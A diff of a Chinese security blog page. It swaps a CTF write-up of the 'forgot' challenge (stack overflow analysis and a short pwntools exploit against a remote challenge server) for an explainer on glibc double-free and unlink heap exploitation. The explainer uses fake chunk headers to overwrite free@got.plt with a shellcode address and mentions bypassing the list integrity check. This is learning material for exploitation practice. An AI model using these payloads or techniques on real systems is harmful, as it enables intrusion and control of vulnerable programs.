@@ -81,22 +81,18 @@
 
 
 
-<meta name="description" content="0x01 寻找漏洞1234567891011xfgg@ubuntu:~/Downloads$ checksec forgot[*] &apos;/home/xfgg/Downloads/forgot&apos;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enab">
+<meta name="description" content="原文借鉴：http://d0m021ng.github.io/2017/02/24/PWN/Linux%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8BDouble-free/ 0x01 Glibc背景知识1Linux下堆分配器主要由两个结构管理堆内存，一种是堆块头部形成的隐式链表，另一种是管理空闲堆块的显式链表（Glibc中的bins数据结构）。关于bins的介绍已经有很多">
 <meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="forgot">
-<meta property="og:url" content="http://yoursite.com/2019/07/27/forgot/index.html">
+<meta property="og:title" content="Double free">
+<meta property="og:url" content="http://yoursite.com/2019/08/07/double free/index.html">
 <meta property="og:site_name" content="xfgg">
-<meta property="og:description" content="0x01 寻找漏洞1234567891011xfgg@ubuntu:~/Downloads$ checksec forgot[*] &apos;/home/xfgg/Downloads/forgot&apos;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enab">
+<meta property="og:description" content="原文借鉴：http://d0m021ng.github.io/2017/02/24/PWN/Linux%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8BDouble-free/ 0x01 Glibc背景知识1Linux下堆分配器主要由两个结构管理堆内存，一种是堆块头部形成的隐式链表，另一种是管理空闲堆块的显式链表（Glibc中的bins数据结构）。关于bins的介绍已经有很多">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190708074114251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190708074419714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190708075022550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70">
-<meta property="og:updated_time" content="2019-07-27T11:13:03.351Z">
+<meta property="og:updated_time" content="2019-08-07T02:21:23.129Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="forgot">
-<meta name="twitter:description" content="0x01 寻找漏洞1234567891011xfgg@ubuntu:~/Downloads$ checksec forgot[*] &apos;/home/xfgg/Downloads/forgot&apos;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enab">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20190708074114251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70">
+<meta name="twitter:title" content="Double free">
+<meta name="twitter:description" content="原文借鉴：http://d0m021ng.github.io/2017/02/24/PWN/Linux%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8BDouble-free/ 0x01 Glibc背景知识1Linux下堆分配器主要由两个结构管理堆内存，一种是堆块头部形成的隐式链表，另一种是管理空闲堆块的显式链表（Glibc中的bins数据结构）。关于bins的介绍已经有很多">
 
 
 
@@ -126,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/07/27/forgot/">
+  <link rel="canonical" href="http://yoursite.com/2019/08/07/double free/">
 
 
 
 
 
-  <title>forgot | xfgg</title>
+  <title>Double free | xfgg</title>
   
 
 
@@ -259,7 +255,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/27/forgot/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/07/double free/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="xfgg">
@@ -276,7 +272,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">forgot</h1>
+          <h1 class="post-title" itemprop="name headline">Double free</h1>
         
 
         <div class="post-meta">
@@ -288,8 +284,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-27T19:02:27+08:00">
-                2019-07-27
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-07T10:10:17+08:00">
+                2019-08-07
               </time>
             
 
@@ -311,8 +307,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/攻防世界/" itemprop="url" rel="index">
-                    <span itemprop="name">攻防世界</span>
+                  <a href="/categories/百度学习/" itemprop="url" rel="index">
+                    <span itemprop="name">百度学习</span>
                   </a>
                 </span>
 
@@ -348,20 +344,12 @@
       
 
       
-        <h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec forgot</span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/forgot'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br><span class="line">只开启了nx保护</span><br><span class="line"></span><br><span class="line">ida分析</span><br></pre></td></tr></table></figure>
+        <p>原文借鉴：<a href="http://d0m021ng.github.io/2017/02/24/PWN/Linux%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8BDouble-free/" target="_blank" rel="noopener">http://d0m021ng.github.io/2017/02/24/PWN/Linux%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8BDouble-free/</a></p>
+<h3 id="0x01-Glibc背景知识"><a href="#0x01-Glibc背景知识" class="headerlink" title="0x01 Glibc背景知识"></a>0x01 Glibc背景知识</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux下堆分配器主要由两个结构管理堆内存，一种是堆块头部形成的隐式链表，另一种是管理空闲堆块的显式链表（Glibc中的bins数据结构）。关于bins的介绍已经有很多，就不赘述了。接下来介绍一下Linux下Double free漏洞原理以及free函数的堆块合并过程。</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20190708074114251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70" alt></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现有两处溢出点</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-Doublefree漏洞原理"><a href="#0x02-Doublefree漏洞原理" class="headerlink" title="0x02 Doublefree漏洞原理"></a>0x02 Doublefree漏洞原理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> free函数在释放堆块时，会通过隐式链表判断相邻前、后堆块是否为空闲堆块；如果堆块为空闲就会进行合并，然后利用Unlink机制将该空闲堆块从Unsorted bin中取下。如果用户精心构造的假堆块被Unlink，很容易导致一次固定地址写，然后转换为任意地址读写，从而控制程序的执行。</span><br><span class="line"></span><br><span class="line">free函数原理：由堆块头部形成的隐式链表可知，一个需释放堆块相邻的堆块有两个：前一个块（由当前块头指针加pre_size确定），后一个块（由当前块头指针加size确定）。从而，在合并堆块时会存在两种情况：向后合并、向前合并。当前一个块和当前块合并时，叫做向后合并。当后一个块和当前块合并时，叫做向前合并。</span><br><span class="line">相关代码</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20190708074419714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70" alt></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以观察到箭头处是个函数指针，&amp;v3 是v3在栈上的地址，&amp;v3 + --v14 是根据&amp;v3在栈上移动，上面的<span class="keyword">for</span>循环是用来改变v14的值，根据溢出点函数指针v3到v12 ，变量v14都可以被我们控制，接下来再找找有没有system函数</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20190708075022550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70" alt></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现目标函数</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">接下来我的想法是利用缓冲区溢出把函数指针v12 覆盖为地址0x080486cc,接下来再控制v14的值为10， 那么 &amp;v3+ --v14 便会指向</span><br><span class="line">v12，随后cat flag</span><br></pre></td></tr></table></figure>
-
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,39675)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*0x44 + p32(0x080486CC) + <span class="string">'a'</span>*0x20 + p32(0x8)</span><br><span class="line"></span><br><span class="line"><span class="comment">#利用缓冲区溢出把函数指针v12 覆盖为地址0x080486cc,接下来再控制v14的值为10， 那么 &amp;v3+ --v14 便会指向</span></span><br><span class="line"><span class="comment">#v12，随后cat flag</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"bbb"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="0x03-Doublefree漏洞利用原理"><a href="#0x03-Doublefree漏洞利用原理" class="headerlink" title="0x03 Doublefree漏洞利用原理"></a>0x03 Doublefree漏洞利用原理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">以64位应用为例：如果在free一个指针指向的块时，由于堆溢出，将后一个块的块头改成如下格式:</span><br><span class="line">fake_prevsize1 = 被释放块大小；</span><br><span class="line">fake_size1 = 0x20 | 1 (fake_size1 = 0x20)</span><br><span class="line">fake_fd = free@got.plt - 0x18</span><br><span class="line">fake_bk = shellcode address</span><br><span class="line">fake_prevsize2 = 0x20</span><br><span class="line">fake_size2 = 0x10</span><br><span class="line">如下图:</span><br><span class="line">如果chunk0被释放(fake_size1 = 0x21)，进行空闲块合并时，1）由于前一个块非空闲，不会向后合并。2）根据chunk2判断后一个块chunk1空闲，向前合并，导致unlink。</span><br><span class="line">如果chunk1被释放(fake_size1 = 0x20)，进行空闲块合并时，1）由于前一个块空闲，向后合并,导致unlink。2）根据chunk2判断后一个块chunk1空闲，向前合并，导致unlink。</span><br><span class="line">根据unlink宏知道， 前一个块 FD 指向 free@got.plt - 0x18, 后一个块 BK 指向 shellcode address。然后前一个块 FD 的bk指针即free@got.plt，值为shellcode address, 后一个块 BK 的 fd 指针即shellcode + 0x10，值为 free@got.plt。从而实现了一次固定地址写。</span><br><span class="line"></span><br><span class="line">High    |----------------|</span><br><span class="line">        |   fake_size2   |</span><br><span class="line">        |----------------|</span><br><span class="line">        | fake_prevsize2 |</span><br><span class="line">        |----------------|  chunk2 pointer</span><br><span class="line">        |    fake_bk     |</span><br><span class="line">        |----------------|</span><br><span class="line">        |    fake_fd     |</span><br><span class="line">        |----------------|  chunk1 malloc returned pointer</span><br><span class="line">        |  fake_size1    |</span><br><span class="line">        |----------------|</span><br><span class="line">        | fake_prevsize1 |</span><br><span class="line">        |----------------|  chunk1 pointer</span><br><span class="line">        |     ......     |</span><br><span class="line">        |    padding     |</span><br><span class="line">        |     ......     |</span><br><span class="line">        |----------------|</span><br><span class="line">        |    fake_bk     |</span><br><span class="line">        |----------------|</span><br><span class="line">        |    fake_fd     |</span><br><span class="line">        |----------------|  chunk0 malloc returned pointer</span><br><span class="line">        |     size       |</span><br><span class="line">        |----------------|</span><br><span class="line">        |   prev_size    |</span><br><span class="line">Low     |----------------|  chunk0 pointer</span><br><span class="line"></span><br><span class="line">但是，由于当前glibc的加固检测机制，会检查显式链表中前一个块的fd与后一个块的bk是否都指向当前需要unlink的块。这样攻击者就无法替换chunk1(或chunk0)的fd与bk。相关代码如下：</span><br><span class="line">如<span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      \</span><br><span class="line">   malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV)</span><br><span class="line"></span><br><span class="line">   针对这种情况，需要在内存中找到一个指向需要unlink块的指针，就可以绕过。</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -391,8 +379,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/07/27/warmup/" rel="next" title="warm up">
-                <i class="fa fa-chevron-left"></i> warm up
+              <a href="/2019/08/06/fastbin_dup_into_stack/" rel="next" title="fastbin_dup_into_stack">
+                <i class="fa fa-chevron-left"></i> fastbin_dup_into_stack
               </a>
             
           </div>
@@ -400,10 +388,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/07/27/pwn1/" rel="prev" title="pwn1">
-                pwn1 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -542,7 +526,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-寻找漏洞"><span class="nav-number">1.</span> <span class="nav-text">0x01 寻找漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-思路分析"><span class="nav-number">2.</span> <span class="nav-text">0x02 思路分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">3.</span> <span class="nav-text">exp</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Glibc背景知识"><span class="nav-number">1.</span> <span class="nav-text">0x01 Glibc背景知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Doublefree漏洞原理"><span class="nav-number">2.</span> <span class="nav-text">0x02 Doublefree漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-Doublefree漏洞利用原理"><span class="nav-number">3.</span> <span class="nav-text">0x03 Doublefree漏洞利用原理</span></a></li></ol></div>
             
 
           </div>
